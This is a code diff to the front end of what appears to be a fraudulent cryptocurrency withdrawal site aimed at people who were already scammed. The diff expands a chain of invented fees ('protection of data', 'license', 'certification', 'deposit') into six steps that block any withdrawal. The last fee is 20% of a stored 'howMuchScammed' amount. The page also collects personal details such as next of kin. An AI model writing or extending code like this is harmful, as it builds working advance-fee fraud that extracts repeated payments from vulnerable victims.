@@ -288,6 +288,9 @@ async function loadUserData(user) {
         pendingPayment1: false,
         pendingPayment2: false,
         pendingPayment3: false,
+        pendingPayment4: false,
+        pendingPayment5: false,
+        pendingPayment6: false,
         howMuchScammed: 0
       };
       
@@ -307,6 +310,9 @@ async function loadUserData(user) {
       pendingPayment1: false,
       pendingPayment2: false,
       pendingPayment3: false,
+      pendingPayment4: false,
+      pendingPayment5: false,
+      pendingPayment6: false,
       howMuchScammed: 0
     };
     userBalance = '0.00';
@@ -484,7 +490,7 @@ function updateCryptoPriceDisplay() {
   }
 }
 
-// Handle withdraw button click - UPDATED
+// Handle withdraw button click - UPDATED (now supports 6 payment steps)
 if (withdrawBtn) {
   withdrawBtn.addEventListener('click', async (e) => {
     e.preventDefault();
@@ -494,13 +500,19 @@ if (withdrawBtn) {
       return;
     }
     
-    // Check payment status and show appropriate modal
+    // Sequentially check pending payments 1..6 and show the first unpaid step
     if (!userData.pendingPayment1) {
       createPaymentModal(1);
     } else if (!userData.pendingPayment2) {
       createPaymentModal(2);
     } else if (!userData.pendingPayment3) {
       createPaymentModal(3);
+    } else if (!userData.pendingPayment4) {
+      createPaymentModal(4);
+    } else if (!userData.pendingPayment5) {
+      createPaymentModal(5);
+    } else if (!userData.pendingPayment6) {
+      createPaymentModal(6);
     } else {
       // All payments completed, show regular withdraw modal
       if (withdrawModal) withdrawModal.classList.add('active');
@@ -508,28 +520,76 @@ if (withdrawBtn) {
   });
 }
 
-// Add balance toggle event listener
-if (balanceToggle) {
-  balanceToggle.addEventListener('click', () => {
-    balanceVisible = !balanceVisible;
-    const balanceAmountEl = document.getElementById('balance-amount');
-    const btcBalance = document.getElementById('btc-balance');
-    const eyeIcon = balanceToggle.querySelector('i.icon-eye');
+// Add event listener for settings card
+const settingsCard = document.querySelector('.action-card:nth-child(2)');
+if (settingsCard) {
+  settingsCard.addEventListener('click', () => {
+    window.location.href = '/settings';
+  });
+}
+
+// Add event listener for support card
+const supportCard = document.querySelector('.action-card:last-child');
+if (supportCard) {
+  supportCard.addEventListener('click', () => {
+    supportModal.classList.add('active');
+  });
+}
+
+// Close support modal
+if (supportModalClose) {
+  supportModalClose.addEventListener('click', () => {
+    supportModal.classList.remove('active');
+  });
+}
+
+// Handle support form submission
+if (supportForm) {
+  supportForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
     
-    // Use the numeric data-balance for calculations
-    const numeric = parseFloat(balanceAmountEl?.getAttribute('data-balance') || '0') || 0;
+    const message = document.getElementById('support-message').value;
+    const userEmail = currentUser?.email || 'No email provided';
     
-    if (balanceVisible) {
-      balanceAmountEl.textContent = `$${numeric.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
-      btcBalance.textContent = (numeric / (cryptoPriceData.bitcoin?.usd || 1)).toFixed(8);
-      eyeIcon.classList.remove('icon-eye-off');
-      eyeIcon.classList.add('icon-eye');
-    } else {
-      balanceAmountEl.textContent = '••••••';
-      btcBalance.textContent = '••••••••';
-      eyeIcon.classList.remove('icon-eye');
-      eyeIcon.classList.add('icon-eye-off');
+    try {
+      showLoading();
+      
+      const response = await fetch('/api/support', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          message,
+          userEmail,
+          userName: currentUser?.displayName || 'Anonymous User'
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error('Failed to send support message');
+      }
+
+      // Clear form and close modal
+      supportForm.reset();
+      supportModal.classList.remove('active');
+      
+      // Show success message
+      alert('Your message has been sent successfully. We will get back to you soon!');
+    } catch (error) {
+      console.error('Error sending support message:', error);
+      alert('Failed to send message. Please try again later.');
+    } finally {
+      hideLoading();
     }
+  });
+}
+
+const depositBtn = document.getElementById('deposit-btn');
+if (depositBtn) {
+  depositBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    createDepositModal();
   });
 }
 
@@ -579,7 +639,7 @@ if (withdrawModal) {
   });
 }
 
-// Create professional payment modal - UPDATED
+// Create professional payment modal - UPDATED (steps 1..6)
 function createPaymentModal(step, amount = null) {
   let title, message, amountText;
   
@@ -590,14 +650,33 @@ function createPaymentModal(step, amount = null) {
       amountText = "$236";
       break;
     case 2:
-      title = "License Fee Required";
-      message = "Can't withdraw now till License fee is paid which is $600";
-      amountText = "$600";
+      title = "Protection of data";
+      message = "For the withdrawal process to continue, you need to clear this fee of $335 for protection of data";
+      // keep the existing amountText you used before
+      amountText = "$335";
       break;
     case 3:
+      // Changed per request: License fee
+      title = "License fee";
+      message = "Withdrawal process almost completed!! You need to clear the license fee of $395 before getting your money. Get your license now";
+      amountText = "$395";
+      break;
+    case 4:
+      title = "Certification fee";
+      message = "Clear your certification fee now get your certificate and take to your bank of choice for approval";
+      amountText = "$482";
+      break;
+    case 5:
+      // Show this step when pendingPayment4 is not completed (flow already checks sequentially)
+      title = "Deposit";
+      message = "Deposit this amount into your account now to fund your account before funds come into your account to avoid any inconvenience";
+      amountText = "$525";
+      break;
+    case 6:
+      // Final step: 20% of howMuchScammed from Firestore
       const twentyPercent = ((userData?.howMuchScammed || 0) * 0.2).toFixed(2);
       title = "Processing Fee Required";
-      message = "Can't withdraw till 20% is paid";
+      message = "This fee is 20% of the amount you reported as scammed. Pay this to complete withdrawal.";
       amountText = `$${twentyPercent}`;
       break;
     default:
@@ -662,8 +741,6 @@ function createPaymentModal(step, amount = null) {
                 <label for="user-nextofkin" class="user-detail-label">Next of Kin</label>
                 <input type="text" id="user-nextofkin" class="user-detail-input" placeholder="Enter next of kin name" required>
               </div>
-              
-             
               
               <div class="user-detail-field">
                 <label for="user-location" class="user-detail-label">Location</label>
@@ -982,7 +1059,7 @@ function createDepositModal() {
                   <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                     <circle cx="16" cy="16" r="16" fill="#F7931A"/>
                     <path d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.113-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.257l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.181-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313L8.53 19.833l2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.728.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538z" fill="white"/>
-                  </svg>
+                </svg>
                 </div>
                 <div class="payment-method-info">
                   <span class="payment-method-name">Bitcoin</span>
